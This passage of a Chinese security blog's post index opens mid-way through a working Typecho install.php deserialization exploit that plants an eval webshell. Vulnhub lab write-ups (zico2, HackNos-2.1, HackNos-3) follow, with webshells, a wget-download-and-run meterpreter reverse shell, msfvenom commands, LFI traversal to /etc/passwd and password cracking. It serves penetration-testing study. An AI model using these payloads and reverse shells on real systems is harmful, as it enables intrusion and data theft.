    private $_params = array(&#39;screenName&#39;=&gt; &#39;file_put_contents(\&#39;shell.php\&#39;, \&#39;&lt;?php @eval($_POST[l]);?&gt;\&#39;)&#39;);
    private $_filter = array(&#39;assert&#39;);
&#125;
$payload1 = new Typecho_Feed();
$payload2 = new Typecho_Request();
$payload1-&gt;addItem(array(&#39;author&#39; =&gt; $payload2));
$exp = array(&#39;adapter&#39; =&gt; $payload1, &#39;prefix&#39; =&gt; &#39;typecho&#39;);
echo base64_encode(serialize($exp));
?&gt;</code></pre>
<h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><pre><code class="php">POST /typecho/install.php?finish=1 HTTP/1.1
Host: 127.0.0.1:8001
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:73.0) Gecko/20100101 Firefox/73.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 519
Origin: http://127.0.0.1:8001
Connection: close
Referer: http://127.0.0.1:8001/typecho/install.php?finish=1
Cookie: PHPSESSID=nf3917m3bbml051b4d8up56qn4; __typecho_lang=zh_CN
Upgrade-Insecure-Requests: 1

__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NTk6ImZpbGVfcHV0X2NvbnRlbnRzKCdzaGVsbC5waHAnLCAnPD9waHAgQGV2YWwoJF9QT1NUW2xdKTs%2FPicpIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6ImFzc2VydCI7fX19fX1zOjY6InByZWZpeCI7czo3OiJ0eXBlY2hvIjt9</code></pre>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/p2.png"></p>
<p>​        其实已经执行成功了。    </p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/p1.png"></p>
<blockquote>
<p>别忘了添加Referer</p>
</blockquote>
<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>删除install.php和install目录</p>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>Typecho 让注册用户直接可以发布文章(无需审核)</title>
    <url>/2017/10/15/typecho-rang-zhu-ce-yong-hu-zhi-jie-ke-yi-fa-bu-wen-zhang-wu-xu-shen-he/</url>
    <content><![CDATA[<h1 id="Typecho-让注册用户直接可以发布文章-无需审核"><a href="#Typecho-让注册用户直接可以发布文章-无需审核" class="headerlink" title="Typecho 让注册用户直接可以发布文章(无需审核)"></a>Typecho 让注册用户直接可以发布文章(无需审核)</h1><p>​    用Typecho搭建的新生签到平台，默认情况下注册的用户属于关注着类别，啥权限没有，应该给予贡献者的等级，可以发布文章，不具备管理的权限，要去后台手动更改，还有就是发布的文章必须管理员审核才会显示在主页。通过更改代码可以实现注册用户直接可以发布文章。       <a href="https://qqdie.com/archives/typecho-send-articles.html/comment-page-1">–转载来源</a></p>
<h2 id="让注册的人成为贡献者组"><a href="#让注册的人成为贡献者组" class="headerlink" title="让注册的人成为贡献者组"></a>让注册的人成为贡献者组</h2><p>修改文件<code>\var\Widget\Register.php</code>第<code>68</code>行：</p>
<pre><code>        $dataStruct = array(
            &#39;name&#39;      =&gt;  $this-&gt;request-&gt;name,
            &#39;mail&#39;      =&gt;  $this-&gt;request-&gt;mail,
            &#39;screenName&#39;=&gt;  $this-&gt;request-&gt;name,
            &#39;password&#39;  =&gt;  $hasher-&gt;HashPassword($generatedPassword),
            &#39;created&#39;   =&gt;  $this-&gt;options-&gt;gmtTime,
            &#39;group&#39;     =&gt;  &#39;subscriber&#39;
        );
</code></pre>
<p>这个数组里面有个<code>&#39;group&#39;</code>应该就是了，将<code>&#39;subscriber&#39;</code>改成<code>&#39;contributor&#39;</code>就行了。</p>
<h2 id="让-“贡献者”-发帖直接通过无需审核"><a href="#让-“贡献者”-发帖直接通过无需审核" class="headerlink" title="让 “贡献者” 发帖直接通过无需审核"></a>让 “贡献者” 发帖直接通过无需审核</h2><blockquote>
<p>方法参考：<a href="http://forum.typecho.org/viewtopic.php?f=4&amp;t=7771">http://forum.typecho.org/viewtopic.php?f=4&amp;t=7771</a></p>
</blockquote>
<p>修改<code>var/Widget/Contents/Post/Edit.php</code>的第<code>222</code>和<code>299</code>行（开发板在 223 和 230 行）<br>将<code>“editor”</code>为<code>“contributor”</code>即可。</p>
]]></content>
      <categories>
        <category>other</category>
      </categories>
      <tags>
        <tag>Typecho</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnhub-zico2靶机记录</title>
    <url>/2019/07/15/vulnhub-zico2-ba-ji/</url>
    <content><![CDATA[<blockquote>
<p>小学期实训的任务，顺便记录一下XD</p>
</blockquote>
<a id="more"></a>

<blockquote>
<p>题目：</p>
<p>下载:<a href="https://www.vulnhub.com/entry/zico2-1,210/">https://www.vulnhub.com/entry/zico2-1,210/</a></p>
</blockquote>
<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>使用VMware导入ova，虚拟机导入时配置网络模式为仅主机。</p>
<blockquote>
<p>推荐Virtualbox，我因为偷懒用Vm，但是后来提权时Vm总是崩溃= =</p>
</blockquote>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="1）主机发现-端口扫描"><a href="#1）主机发现-端口扫描" class="headerlink" title="1）主机发现/端口扫描"></a>1）主机发现/端口扫描</h3><p>通过ifconfig确认网卡的网段，nmap扫描。</p>
<p><img src="https://lanvnal.github.io/images/zico2/image1.png"></p>
<p>发现了ip和开放端口</p>
<h3 id="2）目录扫描"><a href="#2）目录扫描" class="headerlink" title="2）目录扫描"></a>2）目录扫描</h3><p>使用dirsearch扫一波看看有什么发现。</p>
<p><img src="https://lanvnal.github.io/images/zico2/image2.png"></p>
<p>有所发现，dbadmin目录看起来是个后台目录</p>
<h3 id="3）网站扫描"><a href="#3）网站扫描" class="headerlink" title="3）网站扫描"></a>3）网站扫描</h3><p>拿扫描工具扫一下网站</p>
<p><img src="https://lanvnal.github.io/images/zico2/image3.png"></p>
<p>可能存在能利用本地文件包含。</p>
<h2 id="Web站点渗透"><a href="#Web站点渗透" class="headerlink" title="Web站点渗透"></a>Web站点渗透</h2><p>访问/dbadmin发现有个数据库管理页面。</p>
<p><img src="https://lanvnal.github.io/images/zico2/image4.png"></p>
<p><img src="https://lanvnal.github.io/images/zico2/image5.png"></p>
<p>尝试使用弱口令admin直接登录进去。</p>
<p>浏览数据库中信息时发现了存储的用户名和密码。</p>
<p><img src="https://lanvnal.github.io/images/zico2/image6.png"></p>
<p>去cmd5尝试解密，说不定有用。</p>
<p><img src="https://lanvnal.github.io/images/zico2/image7.png"></p>
<p><img src="https://lanvnal.github.io/images/zico2/image8.png"></p>
<p>在exploit-db查询到该版本的phpliteadmin存在代码注入漏洞，链接：</p>
<p><a href="https://www.exploit-db.com/exploits/24044">https://www.exploit-db.com/exploits/24044</a></p>
<p>按照expdb的描述，创建名为shell.php的数据库。</p>
<p>然后在该数据库下创建名为<code>&lt;?php @eval($_POST[&#39;a&#39;]); ?&gt;</code>的表。</p>
<p><img src="https://lanvnal.github.io/images/zico2/image9.png"></p>
<p>View.php存在本地文件包含漏洞。</p>
<p><img src="https://lanvnal.github.io/images/zico2/image10.png"></p>
<p>验证LFI存在，用它来包含创建的数据库文件就能得到webshell。</p>
<p>但是总是500错误，写一句话未能成功。</p>
<p>经验证wget可以执行，可以通过wget下载一个shell反弹到msf。</p>
<p><img src="https://lanvnal.github.io/images/zico2/image11.png"></p>
<p>验证发现可以执行wget。</p>
<p>通过msfvenom生成个马传上去。</p>
<pre><code>./msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=172.16.241.1 lport=4444 -f elf &gt; zicoshell</code></pre>
<pre><code>&lt;?php system(&quot;rm /tmp/zicoshell;cd /tmp;wget http://172.16.241.1:8080/zicoshell;chmod +x zicoshell;./zicoshell&quot;);?&gt;</code></pre>
<p><img src="https://lanvnal.github.io/images/zico2/image12.png"></p>
<p>Msf设置监听同时通过LFI去包含。</p>
<p><img src="https://lanvnal.github.io/images/zico2/image13.png"></p>
<p>成功反弹回来。</p>
<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>现在是www-data用户，通过Linux内核的漏洞来提权至root权限。</p>
<p>通过expdb查找到exp。</p>
<p>通过msf上传exp，编译后运行。</p>
<p>这里遇到了一些问题，应该是VM虚拟机的问题，一提权就崩溃，换Vitualbox就能一次成功。</p>
<p><img src="https://lanvnal.github.io/images/zico2/image14.png"></p>
]]></content>
      <tags>
        <tag>WriteUp</tag>
        <tag>Vulnhub</tag>
        <tag>靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnhub靶机之HackNos-2.1</title>
    <url>/2020/02/07/vulnhub-ba-ji-zhi-hacknos2/</url>
    <content><![CDATA[<h2 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h2><ul>
<li><strong><a href="https://www.vulnhub.com/entry/hacknos-os-hacknos-21,403/">hackNos: Os-hackNos-2.1</a></strong></li>
<li><strong>Name</strong>: hackNos: Os-hackNos-2.1</li>
<li><strong>Date release</strong>: 29 Nov 2019</li>
<li><strong>Author</strong>: <a href="https://www.vulnhub.com/author/rahul-gehlaut,656/">Rahul Gehlaut</a></li>
<li><strong>Difficulty</strong> : Easy to Intermediate</li>
<li><strong>Flag</strong> : 2 Flag first user And second root</li>
<li><strong>Learning</strong> : Web Application | Enumeration | Password Cracking</li>
</ul>
<blockquote>
<ul>
<li><strong><a href="https://drive.google.com/open?id=1Uszfqoomm7iv_c4aiuNb6UPl8Zgfv58s">Download</a></strong></li>
<li><strong><a href="https://download.vulnhub.com/hacknos/Os-hackNos-2.1.ova">Download (Mirror)</a></strong> </li>
<li><strong>Download <a href="https://download.vulnhub.com/hacknos/Os-hackNos-2.1.ova.torrent">(Torrent)</a></strong>  <strong>(<a href="magnet:?xt=urn:btih:B909DCF0619DB181AAA4F5C00967B3217AE6DBAD&dn=Os-hackNos-2.1.ova&tr=http%3A%2F%2Ftracker.vulnhub.com%3A6969/announce&tr=udp%3A%2F%2Ftracker.vulnhub.com%3A6969/announce&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80/announce&tr=udp%3A%2F%2Ftracker.publicbt.com%3A80/announce&tr=udp%3A%2F%2Ftracker.istole.it%3A6969">Magnet</a>)</strong></li>
</ul>
</blockquote>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>靶机设置的Host-Only网络模式，通过本机网卡信息确定虚拟机网断，然后使用Nmap扫描，来确定靶机IP。</p>
<pre><code>➜ sudo nmap -sS -O 192.168.56.0/24
Nmap scan report for 192.168.56.104
Host is up (0.0072s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:BB:35:44 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop</code></pre>
<p>确定主机IP后，然后扫描端口与服务。</p>
<pre><code>➜ sudo nmap -sS -O 192.168.56.0/24
Nmap scan report for 192.168.56.104
Host is up (0.0072s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:BB:35:44 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop</code></pre>
<p>只开放了80和22，那么切入点应该在web服务上。访问网站，index页面是apache配置好的默认页面。</p>
<p>用dirsearch扫描一下目录，发现存在<code>/tsweb</code>目录，访问发现是个Wordpress站点。</p>
<p>首页查看源代码，发现版本号：<code>WordPress 5.3</code>，版本较新，没什么可利用的漏洞。</p>
<p>Wordpress当然要上wpscan啦，果然发现了问题。</p>
<pre><code>➜ wpscan --url http://192.168.56.104/tsweb/ --enumerate u

[i] Plugin(s) Identified:

[+] gracemedia-media-player
 | Location: http://192.168.56.104/tsweb/wp-content/plugins/gracemedia-media-player/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2013-07-21T15:09:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: GraceMedia Media Player 1.0 - Local File Inclusion (LFI)
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9234
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9618
 |      - https://www.exploit-db.com/exploits/46537/
 |      - https://seclists.org/fulldisclosure/2019/Mar/26
 |
 | Version: 1.0 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.56.104/tsweb/wp-content/plugins/gracemedia-media-player/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://192.168.56.104/tsweb/wp-content/plugins/gracemedia-media-player/readme.txt

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 &lt;====================&gt; (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] user
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://192.168.56.104/tsweb/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
</code></pre>
<p>发现了存在问题的插件和一个用户名。</p>
<blockquote>
<p>这里在使用wpscan时遇到了update失败的问题，在文章最后会有问题记录。</p>
</blockquote>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>该插件存在文件读取漏洞</p>
<p>Exp:</p>
<pre><code class="http"> http://192.168.56.104/tsweb/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&amp;cfg=../../../../../../../../../../etc/passwd</code></pre>
<p>读到了一些有用信息：</p>
<pre><code>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
......
......
rohit:x:1000:1000:hackNos:/home/rohit:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
flag:$1$flag$vqjCxzjtRc7PofLYS2lWf/:1001:1003::/home/flag:/bin/rbash</code></pre>
<p>用户：<code>root,rohit,flag</code>，且flag的密码hash也得到了，解密后为<code>topsecret</code>，以flag用户成功ssh登陆。</p>
<ul>
<li>Tips</li>
</ul>
<blockquote>
<p>/etc/passwd:<br>普通用户权限能够查看 </p>
<p>保存用户信息，每一行代表一个用户，每一行通过冒号：分为七个部分</p>
<p>用户名<br>密码，x表示密码保存在/etc/shadow<br>UID，0代表root<br>GID，表示所在组<br>描述信息，依次为Full Name、Room Number、Work Phone、Home Phone和Other<br>用户主目录<br>默认shell类型</p>
<p>/etc/shadow:<br>只有root用户权限能够查看</p>
<p>保存加密后的密码和用户的相关密码信息，每一行代表一个用户，每一行通过冒号：分为九个部分</p>
<p>加密的密码具有固定格式：</p>
<p>$id​$salt$encrypted</p>
<p>id表示加密算法，1代表MD5，5代表SHA-256，6代表SHA-512 salt表示密码学中的Salt,系统随机生成 encrypted表示密码的hash</p>
</blockquote>
<p>根据用户描述，在home/rohit/user.txt发现第一枚flag</p>
<pre><code> MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b </code></pre>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><pre><code>flag@hacknos:/$ id
uid=1001(flag) gid=1003(flag) groups=1003(flag)
flag@hacknos:/$ uname -a
Linux hacknos 4.15.0-70-generic #79-Ubuntu SMP Tue Nov 12 10:36:11 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</code></pre>
<p>flag用户权限非常低，所以需要想办法搞个高点权限的账户，比如www-data，那就想办法写个webshell。</p>
<p>查看Wordpress的配置文件：wp-config.php，查找数据库相关配置。</p>
<pre><code>flag@hacknos:/$ cat /var/www/html/tsweb/wp-config.php|grep DB
define( &#39;DB_NAME&#39;, &#39;wordpress&#39; );
define( &#39;DB_USER&#39;, &#39;wpuser&#39; );
define( &#39;DB_PASSWORD&#39;, &#39;hackNos-2.com&#39; );
define( &#39;DB_HOST&#39;, &#39;localhost&#39; );
define( &#39;DB_CHARSET&#39;, &#39;utf8mb4&#39; );
define( &#39;DB_COLLATE&#39;, &#39;&#39; );</code></pre>
<p>哦吼，发现了用户名和密码，成功登陆mysql。</p>
<p>查询wordpress的用户名和密码</p>
<pre><code>mysql&gt; select user_login,user_pass from wp_users;
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| user       | $P$B.O0cLMNmn7EoX.JMHPnNIPuBYw6S2/ |
+------------+------------------------------------+
1 row in set (0.00 sec)</code></pre>
<p>没办法解密，直接修改密码。</p>
<pre><code>mysql&gt; UPDATE wp_users SET user_pass = MD5(&#39;lanvnal&#39;) WHERE user_login =&#39;user&#39;;
Query OK, 1 row affected (0.05 sec)
Rows matched: 1  Changed: 1  Warnings: 0</code></pre>
<p>登陆后台，修改模板的404.php代码为webshell。通过蚁剑连接。</p>
<p>/tmp是可写目录，直接msf一把梭，获得meterpreter shell。</p>
<pre><code>msf5 &gt; use exploit/multi/handler
msf5 exploit(multi/handler) &gt; set payload linux/x64/meterpreter/reverse_tcp
payload =&gt; linux/x64/meterpreter/reverse_tcp
msf5 exploit(multi/handler) &gt; set LHOST 192.168.56.1
LHOST =&gt; 192.168.56.1
msf5 exploit(multi/handler) &gt; set LPORT 6666
LPORT =&gt; 6666
msf5 exploit(multi/handler) &gt; exploit</code></pre>
<p>上LinEnum搜集信息。</p>
<pre><code>;31m[-] It looks like we have some admin users:m
uid=102(syslog) gid=106(syslog) groups=106(syslog),4(adm)
uid=1000(rohit) gid=1000(rohit) groups=1000(rohit),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
</code></pre>
<p>看了看没有suid提权可利用的程序，看来想办法搞定rohit用户就可以了。</p>
<p>翻靶机文件看看有没有备份之类的会藏有用户密码，在<code>/var/backups/passbkp/</code>目录下发现md5-hash文件。</p>
<pre><code>$1$rohit$01Dl0NQKtgfeL08fGrggi0</code></pre>
<p>解密结果为：<code>!%hack41</code>切换用户，直接sudo</p>
<h3 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h3><pre><code>flag@hacknos:/$ su rohit
Password:
rohit@hacknos:/$ sudo su
[sudo] password for rohit:
root@hacknos:/# ls /root
root.txt
root@hacknos:/# cat /root/root.txt
 _______                         __              __  __     #
/       \                       /  |            /  |/  |    #
$$$$$$$  |  ______    ______   _$$ |_          _$$ |$$ |_   #
$$ |__$$ | /      \  /      \ / $$   |        / $$  $$   |  #
$$    $$&lt; /$$$$$$  |/$$$$$$  |$$$$$$/         $$$$$$$$$$/   #
$$$$$$$  |$$ |  $$ |$$ |  $$ |  $$ | __       / $$  $$   |  #
$$ |  $$ |$$ \__$$ |$$ \__$$ |  $$ |/  |      $$$$$$$$$$/   #
$$ |  $$ |$$    $$/ $$    $$/   $$  $$/         $$ |$$ |    #
$$/   $$/  $$$$$$/   $$$$$$/     $$$$/          $$/ $$/     #
#############################################################

#############################################################
MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b

Blog : www.hackNos.com

Author : Rahul Gehlaut

linkedin : https://www.linkedin.com/in/rahulgehlaut/
#############################################################</code></pre>
<h2 id="遇到的问题和解决方法"><a href="#遇到的问题和解决方法" class="headerlink" title="遇到的问题和解决方法"></a>遇到的问题和解决方法</h2><h3 id="wpscan不能update的问题"><a href="#wpscan不能update的问题" class="headerlink" title="wpscan不能update的问题"></a>wpscan不能update的问题</h3><p>Mac下使用HomeBrew安装最新的wpscan，在wpscan更新数据库时发生错误。</p>
<pre><code>➜ ./wpscan --update
cli_options:
  api_token: pTBhWI3kRUbP8KV3vD6nCtpDussLs9dwYX7bvCSahwQ
_______________________________________________________________
        __          _______   _____
        \ \        / /  __ \ / ____|
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#39;_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
cli_options:
                       Version 2.9.4
          Sponsored by Sucuri - https://sucuri.net
      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
_______________________________________________________________

[i] Updating the Database ...

[!] Unable to get https://data.wpscan.org/local_vulnerable_files.xml.sha512 (status: 403)</code></pre>
<p>curl结果：</p>
<pre><code>➜ curl https://data.wpscan.org/local_vulnerable_files.xml.sha512
error code: 1020%</code></pre>
<p>去GitHub项目看一下最新版本发现版本相差有点大。</p>
<p>应该是版本太老的原因，最新版本已经是3.7.7了，但是brew的没有及时更新。去GitHub的wpscan项目clone最新源码，自行编译就好。</p>
<pre><code>➜ git clone https://github.com/wpscanteam/wpscan
➜ cd wpscan
➜ bundle install &amp;&amp; rake install</code></pre>
<h3 id="wpscan使用上的问题"><a href="#wpscan使用上的问题" class="headerlink" title="wpscan使用上的问题"></a>wpscan使用上的问题</h3><p>现在使用wpscan需要使用官方的api-token，这个可以自己注册一个免费的账号，每日50使用次数。</p>
<p><a href="https://links.jianshu.com/go?to=https://wpvulndb.com/users/choose_plan">注册地址</a></p>
<p>为了方便使用，可以将api-token保存在文件中，在<code>~/.wpscan/scan.yml</code>文件中添加如下内容：</p>
<pre><code>cli_options:
  api_token: YOUR_API_TOKEN</code></pre>
]]></content>
      <categories>
        <category>靶机</category>
      </categories>
      <tags>
        <tag>Vulnhub</tag>
        <tag>靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnhub靶机之HackNos3</title>
    <url>/2020/02/14/vulnhub-ba-ji-zhi-hacknos3/</url>
    <content><![CDATA[<blockquote>
<p>2月14情人节，搞靶机和下雪天更配哦～</p>
</blockquote>
<h2 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h2><ul>
<li><a href="https://www.vulnhub.com/entry/hacknos-reconforce,416/">hackNos: ReconForce</a></li>
</ul>
<ul>
<li><p><strong>Name</strong>: hackNos: Os-hackNos-3</p>
</li>
<li><p><strong>Date release</strong>: 14 Dec 2019</p>
</li>
<li><p><strong>Author</strong>: <a href="https://www.vulnhub.com/author/rahul-gehlaut,656/">Rahul Gehlaut</a></p>
</li>
<li><p><strong>Difficulty</strong> : Intermediate</p>
</li>
<li><p><strong>Flag</strong> : 2 Flag first user And second root</p>
</li>
<li><p><strong>Learning</strong> : Web Application | Enumeration | Privilege Escalation</p>
</li>
</ul>
<blockquote>
<ul>
<li><strong><a href="https://drive.google.com/open?id=1zWTU6BFXPmS8BDeoVc766FwUJQZ4-_RT">Download</a></strong></li>
<li><strong><a href="https://download.vulnhub.com/hacknos/Os-hackNos-3.ova">Download (Mirror)</a></strong> </li>
<li><strong>Download <a href="https://download.vulnhub.com/hacknos/Os-hackNos-3.ova.torrent">(Torrent)</a></strong>  <strong>(<a href="magnet:?xt=urn:btih:9FF44C9BCEDD17BF31022D072B7A587189E3E13E&dn=Os-hackNos-3.ova&tr=http%3A%2F%2Ftracker.vulnhub.com%3A6969/announce&tr=udp%3A%2F%2Ftracker.vulnhub.com%3A6969/announce&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80/announce&tr=udp%3A%2F%2Ftracker.publicbt.com%3A80/announce&tr=udp%3A%2F%2Ftracker.istole.it%3A6969">Magnet</a>)</strong></li>
</ul>
</blockquote>
<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>先探测主机IP，因为虚拟机配置的Host-Only网络模式，通过查看本机虚拟网卡可以确定IP段。</p>
<pre><code class="shell">➜ sudo nmap -sS -O 192.168.56.0/24
确定主机IP：192.168.56.105</code></pre>
<p>扫一下端口看看有哪些服务。</p>
<pre><code class="shell">➜ sudo nmap -sT -A 192.168.56.105
Starting Nmap 7.70 ( https://nmap.org ) at 2020-02-14 19:56 CST
Nmap scan report for 192.168.56.105
Host is up (0.00049s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ce:16:a0:18:3f:74:e9:ad:cb:a9:39:90:11:b8:8a:2e (RSA)
|   256 9d:0e:a1:a3:1e:2c:4d:00:e8:87:d2:76:8c:be:71:9a (ECDSA)
|_  256 63:b3:75:98:de:c1:89:d9:92:4e:49:31:29:4b:c0:ad (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: WebSec

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-csrf: Couldn&#39;t find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn&#39;t find any DOM based XSS.
| http-enum:
|_  /scripts/: Potentially interesting directory w/ listing on &#39;apache/2.4.41 (ubuntu)&#39;
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-stored-xss: Couldn&#39;t find any stored XSS vulnerabilities.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
<p>dirsearch的结果：</p>
<pre><code class="shell">[20:00:32] 200 -  195B  - /index.html
[20:00:35] 301 -  318B  - /scripts  -&gt;  http://192.168.56.105/scripts/
[20:00:35] 200 -    2KB - /scripts/
[20:00:36] 403 -  279B  - /server-status
[20:00:36] 403 -  279B  - /server-status/
[20:00:37] 200 -    0B  - /upload.php</code></pre>
<p>访问发现<code>http://192.168.56.105/scripts/</code>直接列目录，有如下文件：</p>
<pre><code class="shell">api_ticket_create.php  
automail.php  
automail.pl  
rcron.php</code></pre>
<h2 id="漏洞发现-amp-getshell"><a href="#漏洞发现-amp-getshell" class="headerlink" title="漏洞发现&amp;getshell"></a>漏洞发现&amp;getshell</h2><p>一番搜索后发现是osticket搭建的邮件系统，没发现可利用的点。</p>
<p>感觉还有其他的的页面没扫出来，上DirBuster爆破。很快发现了/websec目录，看目录结构是个博客系统。</p>
<p><code>http://192.168.56.105/websec/admin</code>后台登录页面。登录信息为邮箱+密码。按照HackNos靶机的传统应该是和HackNos相关的信息，想到index页面刚才看到了有邮箱地址和一些标题，遂拿来尝试登录，试了两个就成功登录。（果然是HackNos一贯风格）</p>
<pre><code>邮箱：contact@hacknos.com
密码：Securityx</code></pre>
<p> 成功进入后台，是<code>Gila CMS v1.10.9</code>，利用文件管理功能上传文件写入一句话shell，<code>http://192.168.56.105/websec/admin/fm</code>，然后通过重命名移动到网站根目录<code>src/blog/../../../one.php</code></p>
<p>蚁剑连接，拿到第一个flag</p>
<pre><code>/home/blackdevil/user.txt
bae11ce4f67af91fa58576c1da2aad4b</code></pre>
<p>PS:这里可以拿cwel来制作用户密码字典进行爆破</p>
<pre><code class="shell">➜ ./cewl.rb http://192.168.56.105/websec/ &gt; /Users/lanvnal/Files/Vulnhub/HackNos-3/oshacknos3dict.

✦ ➜ cat /Users/lanvnal/Files/Vulnhub/HackNos-3/oshacknos3dict.txt
CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
hackNos
com
and
Bootstrap
JavaScript
Start
www
Out
More
Securityx
has
everything
you
need
get
your
new
website
running
time
All
the
templates
themes
are
open
source
free
download
easy
use
strings
attached
Get
Started
Your
Service
contact
hacknos
core
Plugin
Custom
scripts
for
this
Navigation
template
About
Services
Portfolio
Contact
Security
Find</code></pre>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="信息搜集-1"><a href="#信息搜集-1" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>先上MSF。</p>
<pre><code class="shell">➜ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=6666  -f elf -o /Users/lanvnal/Files/Vulnhub/HackNos-3/shell.elf

msf5 &gt; use exploit/multi/handler
msf5 exploit(multi/handler) &gt; set payload linux/x64/meterpreter/reverse_tcp
payload =&gt; linux/x64/meterpreter/reverse_tcp
msf5 exploit(multi/handler) &gt; set LHOST 192.168.56.1
LHOST =&gt; 192.168.56.1</code></pre>
<p>在config.php发现数据库配置信息，去数据库里看一看。</p>
